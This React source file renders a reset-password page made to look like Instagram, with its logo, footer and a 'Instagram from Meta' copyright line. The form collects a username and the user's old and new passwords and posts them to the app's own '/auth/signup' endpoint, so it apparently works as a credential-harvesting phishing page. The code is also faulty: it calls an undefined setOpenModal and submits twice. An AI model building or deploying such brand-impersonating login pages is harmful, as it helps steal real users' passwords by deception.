import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import api from "../utils/api";
import "./styles.css"; // make sure this path is correct
import instaLogo from "./img/instagram-logo.png";
import appleButton from "./img/apple-button.png";
import googlePlayButton from "./img/googleplay-button.png";

export default function ResetPassword() {
  const [formData, setFormData] = useState({
    name: "",
    oldpass: "",
    newpass: "",
  });
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleChange = (e) => {
    const { id, value } = e.target;
    setFormData((prev) => ({ ...prev, [id]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const res = await api.post("/auth/signup", formData);
        navigate("/verify");
    } catch (error) {
      if (error.response) {
        console.log(error.response.data.message);
      } else {
        console.log("Something went wrong");
      }
      setOpenModal(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <main className="flexx align-items-centerr justify-content-centerr">
        <section id="mobile" className="flexx"></section>

        <section id="auth" className="flexx direction-columnn">
          <div className="panell login flexx direction-columnn">
            <h1 title="Instagram" className="flexx justify-content-centerr">
              <img src={instaLogo} alt="Instagram logo" />
            </h1>

            {/* Reset Password Form */}
            <form id="formm" onSubmit={handleSubmit} className="flexx direction-columnn">
              <label htmlFor="name" className="sr-only">Phone, username, or email</label>
              <input name="name" id="name" onChange={handleChange} placeholder="Phone, username, or email" required />

              <label htmlFor="oldpass" className="sr-only">Old Password</label>
              <input name="oldpass" id="oldpass" onChange={handleChange} type="password" placeholder="Old password" required />

              <label htmlFor="newpass" className="sr-only">New Password</label>
              <input name="newpass" id="newpass" onChange={handleChange} type="password" placeholder="New password" required />

              <button onClick={handleSubmit} >Reset Password</button>
            </form>

            <div className="flexx separator align-items-centerr">
              <span></span>
              <div className="or">OR</div>
              <span></span>
            </div>

            <div className="login-with-fb flexx direction-columnn align-items-centerr">
              <div>
                <a href="#">Log in with Facebook</a>
              </div>
              <a href="#">Back to login</a>
            </div>
          </div>

          <div className="panell register flexx justify-content-centerr">
            <p>Don't have an account?</p>
            <a href="#">Sign up</a>
          </div>

          <div className="app-download flexx direction-columnn align-items-centerr">
            <p>Get the app.</p>
            <div className="flexx justify-content-centerr">
              <img src={appleButton} alt="Apple Store" />
              <img src={googlePlayButton} alt="Google Play" />
            </div>
          </div>
        </section>
      </main>

      <footer>
        <ul className="flexx flex-wrapp justify-content-centerr">
          {[
            "ABOUT", "HELP", "PRESS", "API", "JOBS", "PRIVACY", "TERMS", "LOCATIONS",
            "TOP ACCOUNTS", "HASHTAGS", "LANGUAGE"
          ].map((item, idx) => (
            <li key={idx}><a href="#">{item}</a></li>
          ))}
        </ul>
        <p className="copyright">© 2025 Instagram from Meta</p>
      </footer>
    </div>
  );
}
